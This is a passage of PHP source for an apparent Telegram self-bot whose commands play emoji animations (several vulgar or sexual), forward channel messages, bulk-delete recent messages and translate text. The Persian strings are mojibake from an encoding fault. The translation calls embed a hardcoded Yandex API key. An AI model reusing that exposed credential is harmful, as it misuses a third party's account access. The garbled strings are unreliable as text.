๐ฆ๐ฟ ููุงุช ุงุฐุฑุจุง?ุฌุงู : $azarbayjan

๐ฒ๐พุฑ?ูฺฏ?ุช ูุงูุฒ? : $malezy

๐ฉ๐ฐ ฺฉุฑูู ุฏุงููุงุฑฺฉ : $danmark

๐ณ๐ฟ ุฏูุงุฑ ู?ูุฒููุฏ : $newzland

๐จ๐ณ ?ูุงู ฺ?ู : $china

๐ฏ๐ต ?ู ฺุขูพู : $japan

๐ง๐ญ ุฏ?ูุงุฑ ุจุญุฑ?ู : $bahrin

๐ธ๐พ ู?ุฑ ุณูุฑ?ู : $souria
๐ฅโคโคโคโคโคโคโคโคโฆโฆโฆโฆโฆ๐ฅ
", 'parse_mode' => 'HTML']);
                    }

                    if ($text == "code hang") {
                        foreach (range(165, 182) as $t) {
                            yield $this->sleep(1);
                            $rand = rand(165, 182);
                            yield $this->messages->forwardMessages(['from_peer' => "@pawnfosh", 'to_peer' => $peer, 'id' => [$rand],]);
                        }
                    }


                    if ($text == 'bk' or $text == 'ุจฺฉ?ุฑู') {
                        yield $this->messages->sendMessage(['peer' => $peer, 'message' => '
๐๐๐
๐         ๐
๐           ๐
๐        ๐
๐๐๐
๐         ๐
๐           ๐
๐           ๐
๐        ๐
๐๐๐']);
                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id + 1, 'message' => '
๐         ๐
๐       ๐
๐     ๐
๐   ๐
๐๐
๐   ๐
๐      ๐
๐        ๐
๐          ๐
๐            ๐']);
                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id + 1, 'message' => '
๐๐๐          ๐         ๐
๐         ๐      ๐       ๐
๐           ๐    ๐     ๐
๐        ๐       ๐   ๐
๐๐๐          ๐๐
๐         ๐      ๐   ๐
๐           ๐    ๐      ๐
๐           ๐    ๐        ๐
๐        ๐       ๐          ๐
๐๐๐          ๐            ๐']);


                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id + 1, 'message' => '
๐๐๐          ๐         ๐
๐         ๐      ๐       ๐
๐           ๐    ๐     ๐
๐        ๐       ๐   ๐
๐๐๐          ๐๐
๐         ๐      ๐   ๐
๐           ๐    ๐      ๐
๐           ๐    ๐        ๐
๐        ๐       ๐          ๐
 ๐๐๐          ๐            ๐']);

                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id + 1, 'message' => '
โค๏ธโค๏ธโค๏ธ          โค๏ธ         โค๏ธ
โค๏ธ         โค๏ธ      โค๏ธ       โค๏ธ
โค๏ธ           โค๏ธ    โค๏ธ     โค๏ธ
โค๏ธ        โค๏ธ       โค๏ธ   โค๏ธ
โค๏ธโค๏ธโค๏ธ          โค๏ธโค๏ธ
โค๏ธ         โค๏ธ      โค๏ธ   โค๏ธ
โค๏ธ           โค๏ธ    โค๏ธ      โค๏ธ
โค๏ธ           โค๏ธ    โค๏ธ        โค๏ธ
โค๏ธ        โค๏ธ       โค๏ธ          โค๏ธ
 โค๏ธโค๏ธโค๏ธ          โค๏ธ            โค๏ธ']);

                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id + 1, 'message' => '
๐ฅ๐ฅ๐ฅ          ๐ฅ         ๐ฅ
๐ฅ         ๐ฅ      ๐ฅ       ๐ฅ
๐ฅ           ๐ฅ    ๐ฅ     ๐ฅ
๐ฅ        ๐ฅ       ๐ฅ   ๐ฅ
๐ฅ๐ฅ๐ฅ          ๐ฅ๐ฅ
๐ฅ         ๐ฅ      ๐ฅ   ๐ฅ
๐ฅ           ๐ฅ    ๐ฅ      ๐ฅ
๐ฅ           ๐ฅ    ๐ฅ        ๐ฅ
๐ฅ        ๐ฅ       ๐ฅ          ๐ฅ
 ๐ฅ๐ฅ๐ฅ          ๐ฅ            ๐ฅ']);

                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id + 1, 'message' => '
๐ฑ๐ฑ๐ฑ          ๐         ๐
๐ฑ         ๐ฑ      ๐       ๐
๐ฑ           ๐ฑ    ๐     ๐
๐ฑ        ๐ฑ       ๐   ๐
๐ฑ๐ฑ๐ฑ          ๐๐
๐ฑ         ๐ฑ      ๐   ๐
๐ฑ           ๐ฑ    ๐      ๐
๐ฑ           ๐ฑ    ๐        ๐
๐ฑ        ๐ฑ       ๐          ๐
๐ฑ๐ฑ๐ฑ          ๐            ๐']);

                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id + 1, 'message' => '
๐ฟ๐ฟ๐ฟ          ๐         ๐
๐ฟ         ๐ฟ      ๐       ๐
๐ฟ           ๐ฟ    ๐     ๐
๐ฟ        ๐ฟ       ๐   ๐
๐ฟ๐ฟ๐ฟ          ๐๐
๐ฟ         ๐ฟ      ๐   ๐
๐ฟ           ๐ฟ    ๐      ๐
๐ฟ           ๐ฟ    ๐        ๐
๐ฟ        ๐ฟ       ๐          ๐
๐ฟ๐ฟ๐ฟ          ๐            ๐']);


                    }


                    if ($text == 'ุณุงฺฉ' or $text == 'suck') {
                        yield $this->messages->sendMessage(['peer' => $peer, 'message' => '๐ฃ <=====']);

                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id + 1, 'message' => '๐ฃ<=====']);

                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id + 1, 'message' => '๐ฃ=====']);

                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id + 1, 'message' => '๐ฃ====']);

                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id + 1, 'message' => '๐ฃ===']);

                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id + 1, 'message' => '๐ฃ==']);

                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id + 1, 'message' => '๐ฃ===']);

                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id + 1, 'message' => '๐ฃ====']);

                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id + 1, 'message' => '๐ฃ=====']);

                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id + 1, 'message' => '๐ฃ<=====']);

                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id + 1, 'message' => '<=====']);

                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id + 1, 'message' => '๐ฆ๐ฆ<=====']);

                    }

                    if ($text == 'ุฌู' or $text == 'jaq') {
                        yield $this->messages->sendMessage(['peer' => $peer, 'message' => 'ุฏุฑุญุงู ุฌู....']);
                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id + 1, 'message' => '๐๐ป<=====']);
                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id + 1, 'message' => '<๐๐ป=====']);
                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id + 1, 'message' => '<=๐๐ป====']);
                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id + 1, 'message' => '<==๐๐ป===']);
                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id + 1, 'message' => '<===๐๐ป==']);
                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id + 1, 'message' => '<==๐๐ป===']);
                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id + 1, 'message' => '<=๐๐ป====']);
                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id + 1, 'message' => '<๐๐ป=====']);
                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id + 1, 'message' => '๐๐ป<=====']);
                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id + 1, 'message' => '<=๐๐ป====']);
                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id + 1, 'message' => '<===๐๐ป==']);
                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id + 1, 'message' => '<=๐๐ป====']);
                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id + 1, 'message' => '๐๐ป<=====']);
                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id + 1, 'message' => '<=๐๐ป====']);
                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id + 1, 'message' => '<==๐๐ป===']);
                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id + 1, 'message' => '<=๐๐ป====']);
                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id + 1, 'message' => '๐๐ป<=====']);
                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id + 1, 'message' => '๐ฆ๐ฆ<=====']);
                        yield $this->messages->sendMessage(['peer' => $peer, 'message' => 'ูพุง?ุงู ุฌู']);
                    }
                    if (stripos($text, 'clean ') === 0) {
                        if (!isset($update['message']['reply_to']['reply_to_msg_id'])) {
                            $del = str_replace('clean ', '', $text);
                            if (is_numeric($del)) {
                                for ($i = $msg_id - 1; $i >= $msg_id - 1 - $del; $i--) {
                                    if (in_array($type3, ['channel', 'supergroup'])) {
                                        yield $this->channels->deleteMessages(['channel' => $peer, 'id' => [$i]]);
                                    } else {
                                        yield $this->messages->deleteMessages(['revoke' => true, 'id' => [$i]]);
                                    }
                                }
                                yield $this->messages->sendMessage(['peer' => $peer, 'message' => "โ ูพุงฺฉุณุงุฒ? ุจู ุทูุฑ ฺฉุงูู ุงูุฌุงู ุดุฏ ุชุนุฏุงุฏ : $del ูพ?ุงู ุญุฐู ุดุฏูุฏ"]);
                            } else {
                                yield $this->messages->sendMessage(['peer' => $peer, 'message' => "โ ERROR โ use number for delete"]);
                            }
                        }
                    }
                    if (strpos($text, "ุชุฑุฌูู ") !== false) {
                        $word = trim(str_replace("ุชุฑุฌูู ", "", $text));
                        $gmsg = $update['message']['reply_to']['reply_to_msg_id'] ?? 0;
                        if (in_array($type3, ['channel', 'supergroup'])) {
                            $sath = yield $this->channels->getMessages(['channel' => $peer, 'id' => [$gmsg]]);
                        } else {
                            $sath = yield $this->messages->getMessages(['id' => [$gmsg]]);
                        }
                        if (isset($update['message']['reply_to']['reply_to_msg_id'])) {
                            $messag1 = $sath['messages'][0]['message'];
                            $messag = str_replace(" ", "+", $messag1);
                            if ($word == "ูุงุฑุณ?") {
                                $url = "https://translate.yandex.net/api/v1.5/tr.json/translate?key=trnsl.1.1.20160119T111342Z.fd6bf13b3590838f.6ce9d8cca4672f0ed24f649c1b502789c9f4687a&format=plain&lang=fa&text=$messag";
                                $jsurl = json_decode(yield $this->fileGetContents($url), true);
                                $text9 = $jsurl['text'][0];
                                yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id, 'message' => 'แดสแดษดsสแดแดแด าแด :`' . $text9 . '`', 'parse_mode' => 'MarkDown']);
                            }
                            if ($word == "ุงูฺฏู?ุณ?") {
                                $url = "https://translate.yandex.net/api/v1.5/tr.json/translate?key=trnsl.1.1.20160119T111342Z.fd6bf13b3590838f.6ce9d8cca4672f0ed24f649c1b502789c9f4687a&format=plain&lang=en&text=$messag";
                                $jsurl = json_decode(yield $this->fileGetContents($url), true);
                                $text9 = $jsurl['text'][0];
                                yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id, 'message' => ' แดสแดษดsสแดแดแด แดษด : `' . $text9 . '`', 'parse_mode' => 'MarkDown']);
                            }
                            if ($word == "ุนุฑุจ?") {
                                $url = "https://translate.yandex.net/api/v1.5/tr.json/translate?key=trnsl.1.1.20160119T111342Z.fd6bf13b3590838f.6ce9d8cca4672f0ed24f649c1b502789c9f4687a&format=plain&lang=ar&text=$messag";
                                $jsurl = json_decode(yield $this->fileGetContents($url), true);
                                $text9 = $jsurl['text'][0];
                                yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id, 'message' => ' แดสแดษดsสแดแดแด แดส :`' . $text9 . '`', 'parse_mode' => 'MarkDown']);
                            }
                        }
                    }

                    if ($text == 'ููุจ' or $text == 'ghalb') {
                        yield $this->messages->sendMessage(['peer' => $peer, 'message' => 'โค๏ธ๐งก๐๐']);
                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id + 1, 'message' => '๐โค๐งก๐']);
                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id + 1, 'message' => '๐๐โค๐งก']);
                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id + 1, 'message' => '๐งก๐๐โค']);
                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id + 1, 'message' => 'โค๐งก๐๐']);
                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id + 1, 'message' => '๐โค๐งก๐']);
                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id + 1, 'message' => '๐๐โค๐งก']);
                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id + 1, 'message' => '๐งก๐๐โค']);
                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id + 1, 'message' => 'โค๐งก๐๐']);
                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id + 1, 'message' => '๐โค๏ธ๐งก๐']);
                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id + 1, 'message' => '๐๐โค๐งก']);
                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id + 1, 'message' => '๐งก๐๐โค']);
                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id + 1, 'message' => 'โค๐งก๐๐']);
                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id + 1, 'message' => '๐โค๐งก๐']);
                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id + 1, 'message' => '๐๐โค๐งก']);
                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id + 1, 'message' => '๐งก๐๐โค']);
                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id + 1, 'message' => 'โค๐งก๐๐']);
                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id + 1, 'message' => '๐โค๐งก๐']);
                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id + 1, 'message' => '๐๐โค๐งก']);
                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id + 1, 'message' => '๐งก๐๐โค']);
                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id + 1, 'message' => 'โค๐งก๐๐']);
                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id + 1, 'message' => '๐โค๏ธ๐งก๐']);
                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id + 1, 'message' => '๐๐โค๐งก']);
                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id + 1, 'message' => '๐งก๐๐โค']);
                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id + 1, 'message' => '๐พแดแดข แดแดข แดแดแดแดแด แดแดแดแดแด๐พ']);
                    }


                    if ($text == 'ูุฑุบ') {
                        yield $this->messages->sendMessage(['peer' => $peer, 'message' => '๐ฅ________________๐']);
                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id + 1, 'message' => '๐ฅ_______________๐']);
                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id + 1, 'message' => '๐ฅ______________๐']);
                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id + 1, 'message' => '๐ฅ_____________๐']);
                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id + 1, 'message' => '๐ฅ____________๐']);
                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id + 1, 'message' => '๐ฅ___________๐']);
                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id + 1, 'message' => '๐ฅ__________๐']);
                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id + 1, 'message' => '๐ฅ_________๐']);
                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id + 1, 'message' => '๐ฅ________๐']);
                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id + 1, 'message' => '๐ฅ_______๐']);
                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id + 1, 'message' => '๐ฅ______๐']);
                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id + 1, 'message' => '๐ฅ____๐']);
                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id + 1, 'message' => '๐ฅ___๐']);
                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id + 1, 'message' => '๐ฅ__๐']);
                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id + 1, 'message' => '๐ฅ_๐']);
                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id + 1, 'message' => '๐ฃ๐']);
                    }

                    if ($text == 'ุงุจุฑ') {
                        yield $this->messages->sendMessage(['peer' => $peer, 'message' => 'โก๏ธ________________โ๏ธ']);

                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id + 1, 'message' => 'โก๏ธ_______________โ๏ธ']);

                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id + 1, 'message' => 'โก๏ธ______________โ๏ธ']);

                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id + 1, 'message' => 'โก๏ธ_____________โ๏ธ']);

                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id + 1, 'message' => 'โก๏ธ____________โ๏ธ']);

                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id + 1, 'message' => 'โก๏ธ___________โ๏ธ']);

                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id + 1, 'message' => 'โก๏ธ__________โ๏ธ']);

                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id + 1, 'message' => 'โก๏ธ_________โ๏ธ']);

                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id + 1, 'message' => 'โก๏ธ________โ๏ธ']);

                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id + 1, 'message' => 'โก๏ธ_______โ๏ธ']);

                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id + 1, 'message' => 'โก๏ธ______โ๏ธ']);

                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id + 1, 'message' => 'โก๏ธ____โ๏ธ']);

                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id + 1, 'message' => 'โก๏ธ___โ๏ธ']);

                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id + 1, 'message' => 'โก๏ธ__โ๏ธ']);

                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id + 1, 'message' => 'โก๏ธ_โ๏ธ']);

                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id + 1, 'message' => '๐ฉ']);
                    }
                    if ($text == 'ุจุฏู') {
                        yield $this->messages->sendMessage(['peer' => $peer, 'message' => '๐________________๐โโ']);

                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id + 1, 'message' => '๐_______________๐โโ']);

                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id + 1, 'message' => '๐______________๐โโ']);

                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id + 1, 'message' => '๐_____________๐โโ']);

                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id + 1, 'message' => '๐____________๐โโ']);

                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id + 1, 'message' => '๐___________๐โโ']);

                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id + 1, 'message' => '๐__________๐โโ']);

                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id + 1, 'message' => '๐_________๐โโ']);

                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id + 1, 'message' => '๐________๐โโ']);

                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id + 1, 'message' => '๐_______๐โโ']);

                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id + 1, 'message' => '๐______๐โโ']);

                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id + 1, 'message' => '๐____๐โโ']);

                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id + 1, 'message' => '๐___๐โโ']);

                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id + 1, 'message' => '๐__๐โโ']);

                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id + 1, 'message' => '๐_๐โโ']);

                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id + 1, 'message' => '๐งโโ๐']);
                    }

                    if ($text == 'ุนุดู ุฏู' or $text == 'love4') {
                        yield $this->messages->sendMessage(['peer' => $peer, 'message' => '๐ถโโ________________๐โโ']);

                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id + 1, 'message' => '๐ถโโ_______________๐โโ']);

                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id + 1, 'message' => '๐ถโโ______________๐โโ']);

                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id + 1, 'message' => '๐ถโโ_____________๐โโ']);

                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id + 1, 'message' => '๐ถโโ____________๐โโ']);

                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id + 1, 'message' => '๐ถโโ___________๐โโ']);

                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id + 1, 'message' => '๐ถโโ__________๐โโ']);

                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id + 1, 'message' => '๐ถโโ_________๐โโ']);

                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id + 1, 'message' => '๐ถโโ________๐โโ']);

                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id + 1, 'message' => '๐ถโโ_______๐โโ']);

                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id + 1, 'message' => '๐ถโโ______๐โโ']);

                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id + 1, 'message' => '๐ถโโ____๐โโ']);

                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id + 1, 'message' => '๐ถโโ___๐โโ']);

                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id + 1, 'message' => '๐ถโโ__๐โโ']);

                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id + 1, 'message' => '๐ถโโ_๐โโ']);

                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id + 1, 'message' => '๐๐ธ ๐ป๐พ๐๐ด ๐๐พ๐๐']);
                    }
                    if ($text == 'ููุชูุฑ' or $text == 'motor') {
                        yield $this->messages->sendMessage(['peer' => $peer, 'message' => '๐งฒ________________๐']);

                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id + 1, 'message' => '๐งฒ_______________๐']);

                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id + 1, 'message' => '๐งฒ______________๐']);

                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id + 1, 'message' => '๐งฒ_____________๐']);

                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id + 1, 'message' => '๐งฒ____________๐']);

                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id + 1, 'message' => '๐งฒ___________๐']);

                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id + 1, 'message' => '๐งฒ__________๐']);

                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id + 1, 'message' => '๐งฒ_________๐']);

                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id + 1, 'message' => '๐งฒ________๐']);

                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id + 1, 'message' => '๐งฒ_______๐']);

                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id + 1, 'message' => '๐งฒ______๐']);

                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id + 1, 'message' => '๐งฒ____๐']);

                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id + 1, 'message' => '๐งฒ___๐']);

                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id + 1, 'message' => '๐งฒ__๐']);

                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id + 1, 'message' => '๐งฒ๐']);

                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id + 1, 'message' => '๐ฅ  ฮฒรธรธส  ๐ฅ']);
                    }


                    if ($text == 'ูุงุด?ู' or $text == 'car') {
                        yield $this->messages->sendMessage(['peer' => $peer, 'message' => '๐ฃ________________๐']);

                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id + 1, 'message' => '๐ฃ_______________๐']);

                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id + 1, 'message' => '๐ฃ______________๐']);

                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id + 1, 'message' => '๐ฃ_____________๐']);

                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id + 1, 'message' => '๐ฃ____________๐']);

                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id + 1, 'message' => '๐ฃ___________๐']);

                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id + 1, 'message' => '๐ฃ__________๐']);

                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id + 1, 'message' => '๐ฃ_________๐']);

                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id + 1, 'message' => '๐ฃ________๐']);

                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id + 1, 'message' => '๐ฃ_______๐']);

                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id + 1, 'message' => '๐ฃ______๐']);

                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id + 1, 'message' => '๐ฃ____๐']);

                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id + 1, 'message' => '๐ฃ___๐']);

                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id + 1, 'message' => '๐ฃ__๐']);

                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id + 1, 'message' => '๐ฃ_๐']);

                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id + 1, 'message' => '๐ฅ PooF ๐ฅ']);
                    }

                    if ($text == 'kir' or $text == 'ฺฉ?ุฑ') {
                        yield $this->messages->sendMessage(['peer' => $peer, 'message' => '
๐ฅ         ๐ฅ
๐ฅ      ๐ฅ
๐ฅ   ๐ฅ
๐ฅ๐ฅ
๐ฅ   ๐ฅ
๐ฅ      ๐ฅ
๐ฅ         ๐ฅ']);
                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id + 1, 'message' => '
๐
๐
๐
๐
๐
๐
๐']);
                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id + 1, 'message' => '
๐ฒ๐ฒ๐ฒ
๐ฒ        ๐ฒ
๐ฒ        ๐ฒ
๐ฒ๐ฒ๐ฒ
๐ฒ   ๐ฒ
๐ฒ      ๐ฒ
๐ฒ        ๐ฒ']);
                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id + 1, 'message' => '
๐ฅ         ๐ฅ
๐ฅ      ๐ฅ
๐ฅ   ๐ฅ
๐ฅ๐ฅ
๐ฅ   ๐ฅ
๐ฅ      ๐ฅ
๐ฅ         ๐ฅ
----------------------
๐
๐
๐
๐
๐
๐
๐
----------------------
๐ฒ๐ฒ๐ฒ
๐ฒ        ๐ฒ
๐ฒ        ๐ฒ
๐ฒ๐ฒ๐ฒ
๐ฒ   ๐ฒ
๐ฒ      ๐ฒ
๐ฒ        ๐ฒ
----------------------
ุน? ฺฉ?ุฑ๐๐']);

                    }

                    if ($text == 'ฺฉ?ุฑฺฉูุจุต' or $text == 'kir2') {
                        yield $this->messages->sendMessage(['peer' => $peer, 'message' => '๐ฉ๐ฉ๐ฉ
๐ฉ๐ฉ๐ฉ
๐๐๐
๐ฅ๐ฅ๐ฅ']);

                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id + 1, 'message' => '๐๐ฉ๐
๐๐๐
 ๐๐๐
๐ฉ๐ฉ๐ฉ']);

                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id + 1, 'message' => '๐๐ฉ๐
๐ฉ๐๐
๐ฅ๐ฉ๐ฅ
๐๐๐']);

                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id + 1, 'message' => '๐คค๐๐
๐๐๐
๐ฉ๐ฅ๐ฉ
๐ฉ๐๐']);

                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id + 1, 'message' => '๐ฉ๐ฉ๐ฉ
๐คค๐คค๐คค
๐ฉ๐ฝ๐ฉ
๐ฉ๐๐ฉ']);

                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id + 1, 'message' => '๐๐๐ฉ
๐ฉ๐ฅ๐ฉ
๐ฉ๐๐ฉ
๐ฉ๐๐']);

                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id + 1, 'message' => '๐ฉ๐ฉ๐๐ฉ
๐๐๐๐
๐ฉ๐คค๐๐คค
๐๐๐ฅ๐ฉ']);

                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id + 1, 'message' => '๐ฅ๐๐๐ฅ
๐ฅ๐ฉ๐ฉ๐ฅ
๐๐๐ฉ๐ฅ
๐ฉ๐๐ฉ๐']);

                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id + 1, 'message' => '๐ฉ๐๐ฅ๐
๐ฉ๐ฅ๐๐ฉ
๐๐ฅ๐๐ฅ
๐ฉ๐๐๐
๐ฅ๐ฉ๐ฅ๐ฉ']);

                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id + 1, 'message' => '๐ฉ๐๐๐ฉ
๐ฉ๐๐ฅ
๐๐๐ฅ
๐๐๐ฅ
๐ฉ๐ฅ๐
๐๐๐
๐ฉ๐ฅ๐']);

